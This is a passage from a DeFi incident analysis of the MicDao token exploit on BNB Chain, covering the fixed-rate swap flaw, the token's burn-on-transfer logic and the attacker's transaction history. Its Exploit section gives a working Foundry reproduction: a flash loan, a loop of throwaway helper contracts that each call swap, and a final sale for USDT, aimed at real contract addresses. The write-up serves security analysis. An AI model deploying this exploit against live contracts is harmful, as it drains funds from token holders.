+<p>Following this, a <code>create-&gt;transfer-&gt;work</code> loop ensues.</p>
+<p>Within this loop, the attacker first deploys a smart contract and transfers 2,000 USDT to its address. They then call the contract's <code>work</code> function. Within this function, the intermediary contract <code>swapProxy</code> is invoked with its <code>swap</code> function. The logic of this function aligns with the earlier analysis of the Fund Flow, executing the exchange at a fixed rate of 1:10 for MicDao tokens. In other words, the attacker acquires 20,000 MicDao tokens with 2,000 USDT. Subsequently, the intermediary contract adds liquidity to the pool. (Due to the significant MicDao price increase caused by the attacker's large-scale exchange, adding 2,000 USDT corresponds to adding approximately 23 MicDao tokens.)</p>
+<p>From this process, it becomes evident that the exchange of USDT for MicDao tokens through the <code>swap</code> function of the intermediary contract <code>swapProxy</code> does not involve swapping via a pair. Instead, the intermediary contract itself possesses a substantial number of MicDao tokens and directly offers them to the buyer at a fixed rate of 1:10. Simultaneously, it provides some MicDao tokens and uses the user's inputted USDT to add liquidity.</p>
+<p><img alt="Invocation Flow" src="../../image/231018_MicDao.assets/4254.png" /></p>
+<p>Finally, since the attacker obtained a significant amount of MicDao tokens at a "low price", and the pool became thicker, even though a substantial amount of tokens were inexplicably burned, the attacker still managed to sell them to acquire more USDT than the invested amount. The profits were then transferred to another address.</p>
+<p>This analysis closely aligns with the Fund Flow analysis.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The evident logic flaw lies within the <code>swap</code> function of the <a href="https://bscscan.com/address/0x19345233ea7486c1d5d780a19f0e303597e480b5#code">intermediary contract</a> responsible for exchanging MicDao tokens.</p>
+<p>However, this contract is not open source. Nonetheless, a rudimentary analysis by decompilation suggests that its execution logic is similar to the preceding calls.</p>
+<p><img alt="Vulnerability" src="../../image/231018_MicDao.assets/4359.png" /></p>
+<p>It's worth noting that this function imposes a limit on the amount of USDT an account can swap.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cast<span class="w"> </span>storage<span class="w"> </span>0x19345233ea7486c1d5d780a19f0e303597e480b5<span class="w"> </span><span class="m">9</span><span class="w"> </span>--rpc-url<span class="w"> </span>https://rpc.ankr.com/bsc
+</span></code></pre></div>
+<p>Upon inspection, this limit is set to 2000 ether. This explains why the attacker repeatedly created new contracts to invoke the <code>swap</code> function.</p>
+<p><img alt="Vulnerability" src="../../image/231018_MicDao.assets/2424.png" /></p>
+<p>Additionally, the MicDao tokens transferred to the <code>sender</code> here are calculated as <code>amountUSDT * 1e18 / _price / 2</code>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>cast<span class="w"> </span>storage<span class="w"> </span>0x19345233ea7486c1d5d780a19f0e303597e480b5<span class="w"> </span><span class="m">7</span><span class="w"> </span>--rpc-url<span class="w"> </span>https://rpc.ankr.com/bsc
+</span></code></pre></div>
+<p>With a price of 0.05e18, this results in the sender receiving MicDao tokens in proportion to a 1:10 ratio.</p>
+<p>Examining some of the normal <code>swap</code> transactions before the attack, such as <a href="https://bscscan.com/tx/0x19bb42f2c923f4c264547adde119e550ec842c751ce930f57a37578dd8b4be05">this transaction</a>, the fund flow is as follows.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2343.png" /></p>
+<p>It reveals a similar fund flow to the attacker's <code>swap</code> logic. The key difference is that not all the incoming USDT was used to add liquidity; 10% was transferred to another address.</p>
+<p>Checking the transaction history of the <a href="https://bscscan.com/address/0x862bd1ddee057f6c4d5e76414b7c0a31ce6dbaf1">sender</a> of this transaction reveals a call to the <code>bindRelationship(address referrer)</code> function of <a href="https://bscscan.com/address/0xc13a7517dd880d40e377133fe8ca319ea9e2b6ca">another contract</a> before the <code>swap</code>. The address set as the referrer in this function call matches the address to which the funds were transferred during the <code>swap</code>. In contrast, the attacker omitted this <code>bindRelationship</code> step and instead set the calling contract as the referrer in the <code>swap</code> parameters.</p>
+<p>(Based on the presence of <code>referrer</code>, <code>bindRelationship</code>, and other clues, it seems like this might be a referral-based protocol designed to profit from recommending others, somewhat resembling a Ponzi scheme.)</p>
+<p>In conclusion, it appears that this MicDao token was designed with a special <code>swap</code> entry point that allows for a fixed 1:10 exchange of USDT for MicDao tokens. The entire attack process follows this logic, involving the creation of numerous contracts to call <code>swap</code> in exchange for MicDao (in this sense, it resembles a Sybil Attack). It also leverages a thicker liquidity pool to make a profit. </p>
+<p>Furthermore, this MicDao token has the following <code>transfer</code> function:</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">_transfer</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">sender</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">recipient</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amount</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>override<span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>pairList<span class="p">[</span>recipient<span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span>isDelivers<span class="p">[</span>sender<span class="p">])</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">toBurn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>mul<span class="p">(</span><span class="m m-Decimal">45</span><span class="p">).</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">        </span>super<span class="p">.</span>_transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="m m-Decimal">1</span><span class="p">),</span><span class="w"> </span>toBurn<span class="p">);</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">        </span>amount<span class="w"> </span><span class="o">=</span><span class="w"> </span>amount<span class="p">.</span>sub<span class="p">(</span>toBurn<span class="p">);</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span>super<span class="p">.</span>_transfer<span class="p">(</span>sender<span class="p">,</span><span class="w"> </span>recipient<span class="p">,</span><span class="w"> </span>amount<span class="p">);</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Based on related transactions, <code>pairList</code> is set as the PancakePair, while <code>isDelivers</code> is set to the aforementioned intermediary contract <code>swapProxy</code>. Consequently, if a user tries to transfer tokens directly to the pair for swapping or liquidity provision, 45% of the tokens will be burned.</p>
+<p>Moreover, as mentioned earlier, there were no burn operations conducted on MicDao tokens before the attack, indicating that no one attempted token swaps through the pair.</p>
+<h2 id="exploit">Exploit</h2>
+<h3 id="reproduction">Reproduction</h3>
+<p>Based on the analysis above, combined with the AttackTx, we can reproduce the exploit as follows.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">32711747</span><span class="p">;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">);</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span>dodo<span class="p">.</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>dodo<span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m m-Decimal">99</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="m m-Decimal">100</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;0x00&quot;</span><span class="p">);</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total USDT profit&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">}</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="kt">function</span><span class="w"> </span><span class="nv">DPPFlashLoanCall</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="cm">/*sender*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="cm">/*baseAmount*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span><span class="cm">/*data*/</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span>usdt<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>router<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">    </span>MicDao<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>router<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">    </span>usdtToMicDao<span class="p">();</span>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="w">    </span><span class="kt">uint8</span><span class="w"> </span><span class="nv">i</span><span class="p">;</span>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="w">    </span><span class="kt">while</span><span class="w"> </span><span class="p">(</span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="m m-Decimal">80</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">        </span>HelperContract<span class="w"> </span>helper<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span>HelperContract<span class="p">();</span>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>helper<span class="p">),</span><span class="w"> </span><span class="err">2</span>_000<span class="w"> </span>ether<span class="p">);</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="w">        </span>helper<span class="p">.</span>work<span class="p">();</span>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">        </span><span class="o">++</span>i<span class="p">;</span>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="w">    </span>MicDaoTousdt<span class="p">();</span>
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="w">    </span>usdt<span class="p">.</span>transfer<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="p">}</span>
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="kt">function</span><span class="w"> </span><span class="nv">usdtToMicDao</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">);</span>
+</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>MicDao<span class="p">);</span>
+</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>
+</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="w">    </span>router<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
+</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="w">        </span><span class="err">500</span>_000<span class="w"> </span>ether<span class="p">,</span>
+</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="w">        </span>path<span class="p">,</span>
+</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
+</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a><span class="w">        </span><span class="k">block.timestamp</span>
+</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a><span class="p">}</span>
+</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a>
+</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a><span class="kt">function</span><span class="w"> </span><span class="nv">MicDaoTousdt</span><span class="p">()</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>path<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-3-45"><a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>MicDao<span class="p">);</span>
+</span><span id="__span-3-46"><a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="w">    </span>path<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span>usdt<span class="p">);</span>
+</span><span id="__span-3-47"><a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a>
+</span><span id="__span-3-48"><a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a><span class="w">    </span>router<span class="p">.</span>swapExactTokensForTokensSupportingFeeOnTransferTokens<span class="p">(</span>
+</span><span id="__span-3-49"><a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a><span class="w">        </span>MicDao<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span>
+</span><span id="__span-3-50"><a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span>
+</span><span id="__span-3-51"><a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a><span class="w">        </span>path<span class="p">,</span>
+</span><span id="__span-3-52"><a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
+</span><span id="__span-3-53"><a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a><span class="w">        </span><span class="k">block.timestamp</span>
+</span><span id="__span-3-54"><a id="__codelineno-3-54" name="__codelineno-3-54" href="#__codelineno-3-54"></a><span class="w">    </span><span class="p">);</span>
+</span><span id="__span-3-55"><a id="__codelineno-3-55" name="__codelineno-3-55" href="#__codelineno-3-55"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>The loop for creating contracts used for <code>swap</code> is as follows.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">contract</span><span class="w"> </span><span class="ni">HelperContract</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span>IMicDaoSwap<span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span>SwapContract<span class="w"> </span><span class="o">=</span><span class="w"> </span>IMicDaoSwap<span class="p">(</span><span class="mh">0x19345233ea7486c1D5d780A19F0e303597E480b5</span><span class="p">);</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span>IERC20<span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span>usdt<span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span><span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">);</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span>IERC20<span class="w"> </span><span class="kt">private</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span>MicDao<span class="w"> </span><span class="o">=</span><span class="w"> </span>IERC20<span class="p">(</span><span class="mh">0xf6876f6AB2637774804b85aECC17b434a2B57168</span><span class="p">);</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">private </span><span class="nv">immutable</span><span class="w"> </span>owner<span class="p">;</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">work</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">        </span>usdt<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>SwapContract<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">        </span>SwapContract<span class="p">.</span>swap<span class="p">(</span><span class="err">2</span>_000<span class="w"> </span>ether<span class="p">,</span><span class="w"> </span>owner<span class="p">);</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="w">        </span>MicDao<span class="p">.</span>transfer<span class="p">(</span>owner<span class="p">,</span><span class="w"> </span>MicDao<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">        </span>selfdestruct<span class="p">(</span><span class="kt">payable</span><span class="p">(</span>owner<span class="p">));</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="attack-flow-a-crazy-hacker">Attack Flow | A Crazy Hacker</h3>
+<p>Analyzing the entire attack process of the attacker address <a href="https://bscscan.com/address/0xcd03ed98868a6cd78096f116a4b56a5f2c67757d">0xcd03</a> on MicDao. (It can be observed that as of the time of writing this article, this address has initiated a significant number of transactions.)</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/1759.png" /></p>
+<p>Initially, the attacker obtained funds from FixedFloat on August 24th for transaction fees in subsequent activities.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/1928.png" /></p>
+<p>On August 25th and 26th, the attacker created two contracts, but as of now, there are no recorded invocations.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2049.png" /></p>
+<p>On September 3rd, the attacker created another contract and called its <code>tokenTest</code> function, exchanging 0.1 BNB for another token, which appeared to be without a meaningful purpose.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2201.png" /></p>
+<p>Subsequently, on the same day, two transactions about address <a href="https://bscscan.com/address/0x547fb3db0f13eed5d3ff930a0b61ae35b173b4b5">0x547f</a> were made.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2340.png" /></p>
+<p>On September 7th, there was another transaction involving address <a href="https://bscscan.com/address/0x181ed57a3da2d68971bef20409a1f1237f2727cc">0x181e</a>.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2449.png" /></p>
+<p>Half an hour later, a contract was created, and the <code>0x8a27ecfb</code> function was called.</p>
+<p>Using <a href="https://explorer.phalcon.xyz/tx/bsc/0x58772b024cf31e0ffbfca439ca01c07eb13cd0d3404f44f7c3d59074b9c07eb9">Phalcon analysis</a>, it is evident that this was another attack, targeting the HCT token, resulting in a profit of approximately 35 BNB. Similar to the MicDao attack, the gains were transferred to the address <a href="https://bscscan.com/address/0xa5b92a7abebf701b5570db57c5d396622b6ed348">0xa5b9</a>.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2853.png" /></p>
+<p><img alt="" src="../../image/231018_MicDao.assets/3800.png" /></p>
+<p>The next transaction occurred on October 16th, seemingly creating a contract, but, in reality, the contract merely transferred funds to another address <a href="https://bscscan.com/address/0x3a860f9bcf3f800bac67d771723e3f02dd402d9a">0x3a86</a> through selfdestruct. (This added layer through the contract obscures the transfer and can help to some extent in preventing fund tracing.)</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/2942.png" /></p>
+<p>Then, on October 18th, the attacker called the <code>destroy</code> function of a contract created by address <a href="https://bscscan.com/address/0x3a860f9bcf3f800bac67d771723e3f02dd402d9a">0x3a86</a>. Immediately after, three contracts were created, and the third contract's <code>0x8a27ecfb</code> function was called, initiating an attack on MicDao. (The other two contracts created had no subsequent interactions.)</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/3042.png" /></p>
+<p>On October 20th, 0.43 BNB was used to exchange for USDT and was transferred to address <a href="https://bscscan.com/address/0x3a860f9bcf3f800bac67d771723e3f02dd402d9a">0x3a86</a>.</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/3145.png" /></p>
+<p>Two days later, on October 22nd, the attacker transferred BNB to address <a href="https://bscscan.com/address/0xa5b92a7abebf701b5570db57c5d396622b6ed348">0xa5b9</a>, followed by calls to the <code>approve</code> and <code>Multicall</code> functions, using PancakeRouter to exchange 2 BNB for USDT.</p>
+<p>Subsequently, the attacker approved the contract <a href="https://bscscan.com/address/0x833bAc7161DF736f044dc131a1189Df23d758062">0x833b</a> for USDT tokens, and the contract <a href="https://bscscan.com/address/0x11f3f6F9DdFA6E25F419C17A11a2808eF5311220">0x11f3</a> (MintPool) for BOS tokens, with the contract <a href="https://bscscan.com/address/0x833bAc7161DF736f044dc131a1189Df23d758062">0x833b</a> being created by address <a href="https://bscscan.com/address/0x3a860f9bcf3f800bac67d771723e3f02dd402d9a">0x3a86</a>.</p>
+<p>Subsequently, multiple calls were made to the <code>tokenTest</code> function of the contract <a href="https://bscscan.com/address/0x833bAc7161DF736f044dc131a1189Df23d758062">0x833b</a> and the <code>sell</code> function of the MintPool contract.</p>
+<p>Using Phalcon analysis, it is apparent that this was likely another attack, targeting BOS tokens. In the <code>tokenTest</code> transactions, the attacker used a small amount of USDT to acquire a large amount of BOS tokens and later exchanged them for a substantial amount of USDT tokens in the <code>sell</code> transactions. (The reason why the attacker chose to initiate multiple transactions rather than writing a single attack contract is not clear at this time, as the attack principle has not yet been analyzed.)</p>
+<p><img alt="" src="../../image/231018_MicDao.assets/3409.png" /></p>
